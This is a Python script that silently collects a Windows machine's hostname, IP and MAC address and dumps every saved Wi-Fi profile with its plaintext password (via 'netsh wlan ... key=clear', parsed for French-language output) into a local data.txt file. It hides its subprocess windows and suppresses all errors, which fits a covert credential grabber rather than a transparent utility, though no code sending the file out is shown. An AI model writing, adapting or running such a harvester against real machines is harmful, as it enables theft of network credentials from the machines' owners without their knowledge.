import subprocess
import re
import socket
import uuid
import concurrent.futures

# Add constant for hiding subprocess windows on Windows
CREATE_NO_WINDOW = 0x08000000


def get_pc_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    # Fixed MAC address extraction
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8 * 6, 8)][::-1])
    return hostname, ip_address, mac_address


def save_to_file(filename, pc_name, ip_address, mac_address):
    # Changed to append mode to preserve content
    with open(filename, "a", encoding="utf-8") as file:
        file.write("\n-----------------PC Info-----------------\n\n")
        file.write("PC Name: {}\n".format(pc_name))
        file.write("IP Address: {}\n".format(ip_address))
        file.write("MAC Address: {}\n\n ".format(mac_address))


def get_profile_password(profile_name):
    """Get password for a single WiFi profile."""
    try:
        profile_result = subprocess.run([
            "netsh", "wlan", "show", "profile", profile_name, "key=clear"
        ], capture_output=True, text=True, encoding="utf-8", errors="replace",
           creationflags=CREATE_NO_WINDOW, timeout=5)

        if profile_result.returncode == 0 and profile_result.stdout:
            profile_output = profile_result.stdout
            password_match = re.search(r"Contenu de la clé\s*:\s*(.*?)\s*(?:\n|$)", profile_output)
            wifi_password = password_match.group(1).strip() if password_match else "Password not found"
            return (profile_name, wifi_password)
    except:
        pass
    return (profile_name, "Password not found")


def collect_wifi_info():
    try:
        result = subprocess.run([
            "netsh", "wlan", "show", "profiles"
        ], capture_output=True, text=True, encoding="utf-8", errors="replace", check=True, creationflags=CREATE_NO_WINDOW)

        if result.returncode != 0 or not result.stdout:
            return None

        wifi_profiles_output = result.stdout
        pattern = r"Profil Tous les utilisateurs\s+:\s+(.*)"
        wifi_profile_names = re.findall(pattern, wifi_profiles_output)

        wifi_info = {}

        # Use ThreadPoolExecutor to query profiles in parallel (much faster!)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(get_profile_password, wifi_profile_names)
            for profile_name, password in results:
                if password:
                    wifi_info[profile_name] = password

        return wifi_info

    except subprocess.CalledProcessError as e:
        return None
    except Exception as e:
        return None


def save_wifi_info_to_file(wifi_info, file_path):
    try:
        # Changed to append mode
        with open(file_path, "a", encoding="utf-8") as file:
            file.write("-----------------WIFI Info-----------------\n\n")
            for wifi_name, password in wifi_info.items():
                file.write(f"Wi-Fi Name: {wifi_name}\n")
                file.write(f"Password: {password}\n")
                file.write("=" * 20 + "\n")
            file.write("- * " * 25 + "\n\n")
    except Exception as e:
        pass


if __name__ == "__main__":
    filename = "data.txt"

    # Save PC info
    pc_name, ip_address, mac_address = get_pc_info()
    save_to_file(filename, pc_name, ip_address, mac_address)

    # Collect and save WiFi info
    wifi_info = collect_wifi_info()
    if wifi_info:
        save_wifi_info_to_file(wifi_info, filename)
